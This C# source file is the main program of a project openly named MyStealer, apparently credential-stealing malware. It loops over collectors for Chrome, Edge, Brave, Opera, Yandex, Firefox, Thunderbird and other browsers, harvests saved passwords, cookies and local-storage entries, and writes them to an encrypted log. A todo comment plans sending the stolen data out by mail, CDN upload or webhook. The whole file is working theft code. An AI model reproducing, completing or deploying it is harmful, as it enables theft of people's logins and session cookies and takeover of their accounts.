using MyStealer.Collectors;
using MyStealer.Collectors.Browser;
using MyStealer.Collectors.Browser.ChromiumBased;
using MyStealer.Collectors.Browser.FirefoxBased;
using Serilog;
using System;
using System.Collections.Generic;
using System.IO;

namespace MyStealer
{
    internal static class Program
    {
        private static readonly IBrowserCollector[] BrowserCollectors = new IBrowserCollector[] {
            new Brave(),
            new Chrome(),
            new IridiumBrowser(),
            new MicrosoftEdge(),
            new NaverWhale(),
            new OperaStable(),
            new YandexBrowser(),
            new Firefox(),
            new LibreWolf(),
            new PaleMoon(),
            new Thunderbird(),
            new WaterFox(),
        };

        static void Main(string[] args)
        {
            using (var encHook = new LogEncryptionHook())
            {
                try
                {
                    /* Prepare */

                    NativeMethods.WriteLibraries();
                    if (File.Exists(Config.LogFilePath))
                        File.Delete(Config.LogFilePath); // Delete previous file to prevent appending encryption header

                    var logConfig = new LoggerConfiguration();
                    logConfig = (args.Length > 0 && args[0] == "verbose") ? logConfig.MinimumLevel.Verbose() : logConfig.MinimumLevel.Debug();
                    logConfig = logConfig.WriteTo.File(Config.LogFilePath, hooks: encHook);
                    Log.Logger = logConfig.CreateLogger();

                    /* Do the job */

                    Log.Information("Program entry point called on: {date}", DateTime.Now);

                    var creds = new HashSet<CredentialEntry>();
                    var cookies = new HashSet<CookieEntry>();
                    var localStorage = new HashSet<LocalStorageEntry>();
                    foreach (var browser in BrowserCollectors)
                    {
                        try
                        {
                            Log.Debug("Check if browser is available: {browser}", browser.ApplicationName);
                            if (browser.IsAvailable())
                            {
                                Log.Information("Running browser data collector: {browser}", browser.ApplicationName);
                                browser.Initialize();
                                try
                                {
                                    foreach (var cred in browser.GetCredentials())
                                    {
                                        creds.Add(cred);
                                        Log.Information(cred.ToString());
                                    }
                                }
                                catch (Exception ex)
                                {
                                    Log.Error(ex, "Browser credentials {name} failed.", browser.ApplicationName);
                                }

                                try
                                {
                                    foreach (var cookie in browser.GetCookies())
                                    {
                                        cookies.Add(cookie);
                                        //Log.Information(cookie.ToString());
                                    }
                                }
                                catch (Exception ex)
                                {
                                    Log.Error(ex, "Browser cookies {name} failed.", browser.ApplicationName);
                                }

                                try
                                {
                                    foreach (var storageEntry in browser.GetLocalStorageEntries())
                                    {
                                        localStorage.Add(storageEntry);
                                        //Log.Information(storageEntry.ToString());
                                    }
                                }
                                catch (Exception ex)
                                {
                                    Log.Error(ex, "Browser storages {name} failed.", browser.ApplicationName);
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            Log.Error(ex, "Browser collector {name} failed.", browser.ApplicationName);
                        }
                        finally
                        {
                            browser.Dispose(); // Unload natives
                        }
                    }

                    /* Cleanup */

                    NativeMethods.CleanupLibraries();
                }
                catch (Exception ex)
                {
                    Log.Fatal(ex, "Main thread exception");
                }
                finally
                {
                    Log.CloseAndFlush();
                }
            }

            /* todo: send files over the internet (send to mail, upload to cdn, webhook, etc.) */

            // todo: debug purpose, remove later
            MyCryptExt.DecryptToFile(Config.LogFilePath + ".dec", File.OpenRead(Config.LogFilePath));
        }
    }
}
